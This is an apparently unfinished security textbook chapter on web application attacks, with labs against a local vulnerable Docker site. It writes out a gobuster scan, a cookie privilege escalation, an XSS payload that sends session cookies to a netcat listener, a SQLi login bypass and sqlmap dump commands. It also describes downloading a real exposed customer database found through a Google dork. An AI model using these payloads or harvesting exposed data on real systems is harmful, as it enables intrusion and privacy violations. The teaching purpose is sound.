
# Web Application Attacks
![](web_attacks.jpg)

Web applications are often made accessible to the wide internet for convenience of user reachability.  Doing so opens these sites up to anonymous attacks from anywhere in the world.  This chapter will focus on the risks web applications face and some of the attack techniques and vulnerability classifications.  Using a vulnerable by design local web application, you will test its security and remediate some vulnerabilities identified while using common attacking tools.

**Objectives**
1. Explain the risks associated with web applications and how they can be tested.
2. Demonstrate passive and active reconnaissance and discovery techniques of web applications.
3. Conduct a directory busting attack against a victim web applications using Gobuster.
4. Understand how web applications manage sessions and escalate privileges of a vulnerable application.
5. Perform cross site scripting and SQL injection attacks and remediate their vulnerabilities.

## Web Security Risks
Understanding the impacts that can be caused by a security breach of a web application is paramount as without it the application is sure to have untreated risks.  If the risks are not well understood, or worst yet fully dismissed, then the likelihood and impact of realizing those risks increases dramatically.  Every web application's impact will vary depending on the organization, the type of data that is processed, and many other factors we could imagine.

>[!activity] Activity 9.1 - Web Security Risks
>Take a few minutes to critically think why web application security is important.  Try to thoroughly consider the following questions:
>1. What can happen if there are weaknesses in web security?
>2. How can those weaknesses be used to impact the greater organization?
>3. How many weaknesses are there and what level of impact would each one have?

We can imagine that an untreated vulnerability could lead to the complete compromise of an entire compromise of an organization's systems and data.  Other vulnerabilities could lead to the compromise of individual user accounts of that web application and their respective data.  Yet more vulnerabilities could result in the web application's integrated systems being taken over.  The impact of these, and countless other vulnerability scenarios can be extremely high as web applications are often facing the public internet offering a front door to the organization's larger network.

In the previous Web Application Defense chapter we introduced the OWASP Top 10, which is a list of generalized and common web application risks.  The list outlines broad categories of risk and its supporting documentation outlines examples of web application vulnerabilities associated with that risk.  It is a useful reference to categorize and prioritize the types of issues a web application has, but it does not provide a comprehensive mapping or description of all the vulnerabilities an application could have.  For example, number three on the 2021 OWASP Top 10 list is *injection* which goes on to describe common injection attacks such as SQL and OS command. [^1]  But there are many other injection attacks that could be described in further detail as to how they work and how to prevent them.

The MITRE project *common weakness enumeration (CWE)* attempts to aggregate and correlate software vulnerabilities into a classification scheme in much richer detail then the generalized format OWASP Top 10 provides us.  The CWE library, which can be browsed at https://cwe.mitre.org/, currently comprises of nearly one thousand weaknesses across software and hardware.  Each weakness is tracked using a unique ID with the syntax `CWE-##` and given a title, for example CWE-77 Improper Neutralization of Special Elements used in a command ('Command Injection') whose screenshot is below. [^2]  

![[../images/09/cwe_command_injection.png|CWE Command Injection Page]]

This empowers OWASP Top 10 maintainers to attribute CWEs with each of the listed top 10 risk categories.  Each CWE entry includes verbose descriptions, related CWEs and categories, technical impacts, detailed examples with code snippets, real world vulnerabilities discovered, and mitigation strategies to cure the weakness.  Security professionals in this space, such as Application Security Engineers or Web Application Penetration Testers, often reference the CWEs related to discovered vulnerabilities.  Doing so supports the validity of the concern as some stake holders may debate the validity of the security concern - using CWEs demonstrates the wider industry's understanding of the risk.  But the security professional wouldn't use the CWE database as a means to systematically test an application as it is not organized in a manner that is conducive to efficient testing.

Rather, a security professional could use a testing framework designed in a natural flow to identify vulnerabilities.  Almost like a checklist to ensure they don't miss categories of vulnerabilities that they would otherwise be working off their infallible memory.  One great resource that attempts to organize such testing efforts is the *OWASP Web Security Testing Guide (WSTG)* available at https://owasp.org/www-project-web-security-testing-guide/stable/.  This is another opensource and free resource sponsored by the OWASP Foundation.  The first few sections of the guide introduces secure development practices and instructions on how to use the guide.  Of particular interest is section 4 Web Application Security Testing that outlines many web application attack vectors in a logical order.  Major subsections of section 4 include the following:

- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input Validation Testing
- Testing for Error Handling
- Testing for Weak Cryptography
- Business Logic Testing
- Client-side Testing
- API Testing

Each of these subsections are further broken down into yet further subsections which are tailored to specific vectors.  Continuing with our earlier command injection topic, which was identified in the OWASP Top 10 and the CWE, is the WSTG's subsection 4.7.12 Testing for Command Injection. [^3] The WSTG entry for command injection provides an overall summary, testing instructions which include the technical details and malicious payloads to attempt, as well as recommended remediation steps.  Unlike CWE which categorizes and supports the type of vulnerability, WSTG entries give detailed testing instructions on how to approach the discovery of the vulnerability.
![[../images/09/wstg_command_injection.png|WSTG Testing for Command Injection Page]]

The remainder of this chapter will explore the practical demonstration of web application security vulnerabilities.  It won't be comprehensive and interested readers are encouraged to explore the mentioned resources to learn more about this risky and highly in demand information security sub-discipline.
## Application Discovery
I have personally heard, on more than one occasion, management of organizations making the argument that security is not a concern because the business was too small or otherwise not signification enough to be targeted by threat actors.  That couldn't be further from the reality of how the average attacker targets their victims.  While it is feasible that a malicious actor might target a specific organization for explicit reasons that speak true to misinformed managers I've dealt with, the majority of attacks come from opportunity.  As so many organizations have a web presence now, with robust web applications facing the internet, as well as the use of countless *software as a service (SaaS)* applications, the opportunity for attacks is very high.  

Because the internet is so vast, and well indexed, attackers leverage the ability to detect application types using free and available online resources.  For instance, they will identify a vulnerability in a technology and then seek all the instances on the internet that are using the vulnerable technology to create a potential population to attack.  Then they systematically attack that list to achieve some impact.  They might use those compromised systems in a bot net, to ransom, or sell that access to another criminal group.  In this section, we will explore a few ways attackers can use internet available resources to identify potential targets.  We won't cover all the methods but you should develop a general understanding how easy it is to conduct *passive reconnaissance* against web applications.
### Google Dorks
Search engines constantly scour the internet's IP ranges, registered domains, and shared links caching and index web site context and content to make available within their web based querying utilities by any anonymous user.  These organizations do this by creating bot programs called *crawlers* that scrape a targeted website for content and links to other internet resources then repeating the process.  Crawlers will periodically revisit the site to identify any changes and update its records.  They are extremely good at finding and categorizing files on the internet which supports the business model of search engine companies.  Afterall, search engine companies, like Google, want to provide their userbase with quality results, so the more accurate and expansive the index generated by crawlers the better experience for users and the more popular it will become - and the more advertisements that can be placed.

Anybody reading this text undoubtably would have used a search engine recently and understands the basic premise of searching the internet.  Visit the search engine page, or built in search/URL field in a browser, enter a few key words related to what you are looking for, and be presented with a list of many websites all but guaranteed related to what you are searching for.  But that only describes the basic search query and most of the popular search engines support *advanced queries*.   For instance, on Google's Advanced Search page you tailor searches to deliver exact phrases, exclude items, or target specific file types or domains. [^4] 

Combining the thoroughness of crawlers, powerful search indexes, and use of advance search features empowers anyone to query for targeted items, including attackers.  For instance, assume a malicious actor finds a novel vulnerability in Atlassian's Confluence web application and wants to find an indiscriminate list of potential targets to attack, they could use Google's advanced search to find all web sites whose website title includes the word "confluence".  In another example, maybe an attacker wants to search for publicly exposed SQL backup files that includes sensitive information like the usernames and passwords of a custom web application that is exposed to the internet, they could use an advanced query that that searches for the file type ".sql" and the keyword "backup".  If we use our imagination we could come up with a list of potential things to search for on Google that have a material security interest.  Such search criteria is called a **Google dork** and communities have been formed to crowdsource lists of thousands of interesting dorks.

> [!activity] Activity 9.2 - Google Dorks
> We explored the Exploit Database website in the Security Systems chapter as it contains a library of exploit code for known vulnerabilities.  This site also contains a crowdsourced library of Google dorks call the *Google Hacking Database (GHDB)*. [^5]   This database is constantly being added to and currently contains nearly ten thousand entries.  Conveniently, it has a search feature to narrow down what we could target.  Searching for a dork regarding back SQL databases returns a list of 11 entries.
> ![[../images/09/dork_activity_dorks.png|GHDB Search for SQL Backup Dorks]]
> The 9th dork on the list looks interesting to me as it is dynamic using "or" operatives and a wide range of SQL backup related keywords.  Jumping to a fresh browser I search the dork and find several interesting websites indexed by Google.  I took the liberty of redacting some of the specific details of the first entry.
> ![[../images/09/dork_activity_search.png|Google Dork Results for SQL Backup Files|500]]
> I select the first page that is returned and I am presented with a small list of zipped SQL files that are a few years old.
> ![[../images/09/dork_activity_dbs.png|List of SQL Backups|400]]
> Downloading and opening the first SQL backup file I can see there is a table called customers that includes columns like email, date of birth, password, API token, phone number, bank name, account number, and other less interesting information.
> ![[../images/09/dork_activity_customer_schema.png|SQL Backup Customers Table Schema|500]]
> The table after this is the backup table with the insert command and the information of a couple dozen "customer" accounts.
> ![[../images/09/dork_activity_customer_values.png|Customer Table Values|550]]

### Website Discovery
The *uniform resource locator (URL)*, or web address, comprises of the protocol, subdomain, domain. top level domain, and path to the file.  Take the following URL as an example:

```
https://www.google.com/
```

The protocol is `https://`, the subdomain is `www`, the domain is `google`, the top level domain is `com`, while the path is `/`.  Once a system administrator purchases a domain from a registrar, they create an A DNS record that points that domain to a specified IP address.  But the administrator can create other subdomains with corresponding CNAME records that point to other IP addresses.  Any number of subdomains can be created this way without requiring the purchasing of additional domains.  In fact, any number of nested subdomains can be created to!  This means that a given domain may have multiple web applications nested under it facing the public internet.

Once an attacker has a target domain, they can use search engines to discover other web sites and applications related to the domain.  The last section described search engine web crawlers and their indexing capabilities.  We can use our advanced querying knowledge to identify all of the subdomains a domain might have using Google dorks.  Say I wanted to target Yahoo and find all of their subdomains.  I could search for all pages on the domain and then note the subdomains that are listed.  I'll use the following search query in Google to list all Yahoo webpages.
```
site:yahoo.com
```
![[../images/09/yahoo_search.png|Google Dork Yahoo Site]]
The first couple results show `login.yahoo.com` and `fr.yahoo.com` subdomains and then there are some 109 million additional pages.  As I am trying to compile a list of all the subdomains Yahoo has, I note these first to and then exclude them from my subsequent queries using the minus character.
```
site:yahoo.com -site:login.yahoo.com -site:fr.yahoo.com
```
![[../images/09/yahoo_subdomains.png|Refining Dork to Exclude Select Subdomains]]
The next two subdomains are `shopping.yahoo.com` and `finance.yahoo.com` and the total results are now about 86 million.  Not bad shaving off 23 million records!  I add shopping and finance to my growing list of discovered subdomains for Yahoo and repeat the process until I have exhausted all Google results.  You might be thinking that this task could be automated, and you'd be right!  Checkout the Sublist3r tool by aboul3la on GitHub. [^6]   This opensource tool written in Python scrapes search engines for a given domain and returns a list of subdomains.  Watch out though, as Google is pretty good at detecting and thwarting automated scans such as these by pacing CAPTCHAs.

>[!info] Info - OSINT
>*Open source intelligence (OSINT)* is the passive reconnaissance technique of using available information on a target usually on the internet or public sources.  Much of the activities discussed in this section are OSINT techniques, although there are many more that are not covered in this chapter.

There are other methods to discover subdomains on a target.  One of my favorite sites is `crt.sh` which gathers TLS certificate information on domains and compiles it into a searchable online database.  Often certificates include subdomains under the domain that are trusted under the certificate.  This listing can be scrapped together as yet another source to compile a live list of targets.  The following screenshot is taken from crt.sh after querying for "google.com".  It returns a long list of Google subdomains!
![[../images/09/crt_sh.png|Crt.sh Query for Google Subdomains]]
## Web Attacks
### Directory Busting
>[!activity] Activity 9.3 - Directory Busting

### Solving Stateless HTTP
Authentication
Cookie Security
> [!activity] Activity 9.4 - Cookie Privesc

### Cross Site Scripting (XSS)
XSS Types
>[!activity] Activity 9.5 - Cross Site Scripting

### Relational Databases
Database Queries
SQL Injection (SQLi)
SQLi Mitigations
> [!activity] Activity 9.6 - SQL Injection

### Web Proxy Tool - BurpSuite
BurpSuite
PortSwigger Academy

## Exercises
>[!exercise] Exercise 9.1 - Directory Busting
>In this task you will perform directory busting against a vulnerable web application running as a docker container on your Kali VM.
>#### Step 1 - Install Docker
>Run the following commands in a bash terminal and then restart your VM If you don't already have Docker installed.
>```bash
>sudo apt update 
>sudo apt install -y docker.io 
>sudo usermod -aG docker $USER
>```
>#### Step 2 - Run Vulnerable-Site
>Clone the vulnerable-site repository on your Kali VM.
>```bash
>git clone https://github.com/dhammon/vulnerable-site
>```
>Change directory to vulnerable-site and run the vulnerable app as a docker container. Allow a couple minutes for the image layers to download and the applications to start.
>```bash
>docker run -it -d -p "80:80" -v ${PWD}/app:/app --name vulnerable-site mattrayner/lamp:latest
>```
>The container will run in the background but may need a couple minutes to fully boot. After waiting a couple minutes, run the db.sh script on the container to populate the application's database. If you receive an " ERROR 2002 (HY000) " it means you need to wait another minute for the container to fully boot.
>```bash
>docker exec vulnerable-site /bin/bash /app/db.sh
>```
>Open your Kali VM Firefox browser to [http://127.0.0.1](http://127.0.0.1/) and observe the vulnerable-site application is running!
>#### Step 3 - Install Gobuster
>Install the gobuster package on your Kali VM.
>```bash
>sudo apt install gobuster -y
>```
>#### Step 4 - Directory Busting
>Start a directory busting attack against the vulnerable-site using gobuster and discover the db.sh script in the web root directory.
>```bash
>gobuster dir -u [http://127.0.0.1/](http://127.0.0.1/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php,sh
>```
>After a few seconds, gobuster discovers the db.sh file! Open the Firefox browser in your Kali VM and navigate to the file [http://127.0.0.1/db.sh](http://127.0.0.1/db.sh). The file downloads from the container.  Open the file by clicking the download shortcut and observe the file contents include username and passwords in the INSERT commands!
>
>From your Kali VM Firefox browser, navigate to the vulnerable site's login page [http://127.0.0.1/](http://127.0.0.1/). Enter the administrator username and password found from the db.sh file.  Observe that the credentials were valid as the browser directs us to the Administrator page, pwned!!
>

>[!exercise] Exercise 9.2 - Cookie Privesc
>Web applications could insecurely rely on cookie values to handle authorization decisions. You will identify and exploit a vulnerable application's cookie to escalate privileges in this task from your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 2 - Enumerate Cookies
>With the vulnerable-site running in your Kali VM, open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/). Log in as the low privileged user (username=daniel and password=Password123).
>
>Open the developer console (F12), select the Storage tab, Cookies (left navigation tree), and select the [http://127.0.0.1](http://127.0.0.1/) site. Observe that there is a cookie called "role" with a value of "user".
>#### Step 3 - Escalate Privileges
>With the "role" cookie identified in the developer console, double click the cookie value ("user") and replace the value with the word "administrator" and press enter.
>
>Reload the page with the new cookie value. Observe the page changes from the User Page to the privileged Administrator Page!
>#### Step 4 - Remediate Vulnerable Cookie
>Trusting cookie values, especially for authorization purposes, can lead to privilege escalations. A better approach would be to place authorization variables server side in sessions. Launch a bash terminal in the Kali VM and open the index.php file using nano. Observe that the cookie is set in line 14's setcookie function call.
>```bash
>nano ~/vulnerable-site/app/index.php
>```
>With the index.php file open, replace the setcookie line with a line that sets the role as a session variable. Press CTRL+X, Y for yes, and Enter to save the file changes.
>```php
>$_SESSION['role'] = $role;
>```
>Open the home.php file in nano and inspect its contents. Observe the cookie "role" is used to check if the requestor is an administrator and will present the privileged content on line 7.
>```bash
>nano ~/vulnerable-site/app/home.php
>```
>Replace home.php's line 7 magic variable $\_COOKIE with the magic variable $\_SESSION that was set in the index.php file. Press CTRL+X, Y for yes, and Enter to save the file.
>```php
>if($_SESSION['role'] == 'administrator') {
>```
>Launch a new Firefox instance, navigate to [http://127.0.0.1/](http://127.0.0.1/), login as the low privilege user (username=daniel and password=Password123). Inspect the cookies to and confirm the role cookie is no longer in use!

>[!exercise] Exercise 9.3 - Cross Site Scripting (XSS)
>You will discover and exploit an XSS vulnerability in the vulnerable-site to steal the administrator's session cookie in your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify XSS
>With the vulnerable-site running in your Kali VM, launch a private Firefox instance and navigate to [http://127.0.0.1/](http://127.0.0.1/). Press the "hamburger menu" icon (three stacked horizontal lines) in the upper right corner of Firefox and select "New private window". This private window will be our Attacker's browser.
>
>Open the source code of the login page by right clicking anywhere in the page and selecting "View Page Source" from the context menu.
>
>A new tab opens displaying HTML code that includes a hidden form value "version" with the value "beta".
>
>Return to the login page and enter the known credentials for the low privileged user (username=daniel and password=Password123). Entering the correct credentials logs us into the User Page.
>
>Observe that the page has a footer displaying the version as "beta". In addition, observe that the URL includes a parameter "&version=beta". Change the value for the version parameter in the URL bar to "foobar" and press enter to load the page with the new value.
>
>`http://127.0.0.1/?username=daniel&password=Password123&version=foobar`
>
>We observe that the GET parameter version reflects our user input! Replace the "foobar" value with the test XSS payload "<script>alert(1)</script>" and press enter to reload the page. 
>
>`http://127.0.0.1/?username=daniel&password=Password123&version=<script>alert(1)</script> `
>
>Our JavaScript alert box executed! Press Ok in the alert box to finish loading the page.
>#### Step 4 - Stage the Attack
>You will craft a malicious payload that sends the admin user's cookie value to an attacker-controlled server. The following payload creates an image object sourced from a remote server. The remote server is our attacker-controlled URL that has the victim user's cookie appended to it.
>
>`<script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>`
>
>This payload includes special characters that the browser will interpret, change, and break. Therefore, we will use the URL encoded version.
>`%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E `
>
>This payload replaces the GET parameter version value in the following link. The following link will be sent to the victim admin user with an enticing message to lure them into clicking it while logged into the vulnerable site.
>
>`http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E`
>
>Next, set up the attacker server. Open a bash terminal and run a netcat listener that will capture the request and cookie when the victim clicks on the link. Observe the netcat listener remains open awaiting a connection.
>```bash
>nc -lp 9001
>```
>#### Step 5 - Trigger the Attack
>Open a new non-private Firefox browser and navigate to [http://127.0.0.1/](http://127.0.0.1/). This browser session will be used to simulate the victim activity.
>
>Login as the admin user (username=admin and password=SuperSecret1!).
>
>In the same Firefox window where the victim is logged into the vulnerable application, open a new Firefox browser tab and paste the malicious link in the URL bar and press enter. Observe the page loads as normal. This simulates the victim clicking on the link in an email or instance message for example.
>
>`http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E`
>
>Navigate to the attacker terminal with the netcat listener setup in the previous step. Observe the received connection from the victim that includes their cookie values!  The PHPSESSID cookie value is the session identifier used by the web application to identify logged in users. With this token, the attacker can access authenticated pages as the victim!
>#### Step 6 - Mitigate the Vulnerability
>In a Kali VM bash terminal, open the home.php file in the vulnerable-site/app directory using nano text editor.
>```bash
>nano ~/vulnerable-site/app/home.php
>```
>Observe the last line echos the version GET parameter without any input validation or output encoding. Update the last line by wrapping the $\_GET['version'] in the htmlspecialchars function. Press CTRL+X, Y for yes, and Enter to save over the exiting file.
>```php
>echo "Version: ".htmlspecialchars($_GET['version']);
>```
>Open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/) . Enter the username and password (username=daniel and password=Password123) to log into the application.
>
>Replace the previously vulnerable GET parameter "version" value of "beta" with our XSS test payload "<script>alert('xss')</script>" and press enter. Observe this time that the page loads without the alert popup window and instead displays the payload as raw text!
>


>[!exercise] Exercise 9.4 - SQL Injection (SQLi)
>Bypass authentication controls by exploiting a SQL injection vulnerability. Then dump the users table from the database using SQLmap.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify SQLi
>With the vulnerable-site running in your Kali VM, navigate to [http://127.0.0.1/](http://127.0.0.1/) and enter an incorrect username and password combination. Observe the error message "Wrong username/password" is displayed.
>
>Press the back button to return to the login screen. Enter a new username and password but this time include an apostrophe ' in your username and submit. Observe this time no error message is displayed. This subtle change in behavior suggests there may be a SQL injection vulnerability.
>#### Step 4 - Manual SQLi Exploitation
>Return to the vulnerable-site login page. Enter the following payload as the username and password and press the submit button. Observe the application logs us in as the administrator!
>
>`lol' OR 1=1-- -`
>#### Step 5 - Automated SQLi with SQLMap
>Return to the vulnerable-site's login page and enter any incorrect username and password. Observe the "Wrong username/password" message. Copy the URL to your clipboard to use in the sqlmap tool.
>
>`http://127.0.0.1/?username=lol&password=lol&version=beta 
>
>Open a bash terminal and run sqlmap against the URL you just copied.
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch
>```
>Allow a minute for the tool to complete its analysis. Observe that sqlmap discovered the application is vulnerable to time-based blind injection attacks!
>
>Enumerate the database names using the --dbs flag. Observe sqlmap slowly identifies each letter of each database name. After a few minutes, the databases mysql, information_schema, performance_schema, sys, and company are identified!
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch --dbs
>```
>The database company looks interesting. Run sqlmap targeting that database and dump all tables within it. The tool takes several minutes to complete but identifies one table named users, the column names, and then the values in the table.
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch -D company --dump
>```


[^1]: A03 Injection; OWASP Top 10.2021; March 10th 2024; https://owasp.org/Top10/A03_2021-Injection/
[^2]: CWE - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection') (4.14); MITRE CWE; March 10th 2024; https://cwe.mitre.org/data/definitions/77.html
[^3]: WSTG - Stable; Testing for Command Injection; OWASP Foundation; March 10th 2024; https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
[^4]: Google Advanced Search; Google; March 10th 2024; https://www.google.com/advanced_search
[^5]:Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon; Exploit Database; March 10th 2024; https://www.exploit-db.com/google-hacking-database
[^6]: aboul3la/Sublist3r: Fast subdomains enumeration tool for penetration testers; GitHub; March 13 2024; https://github.com/aboul3la/Sublist3r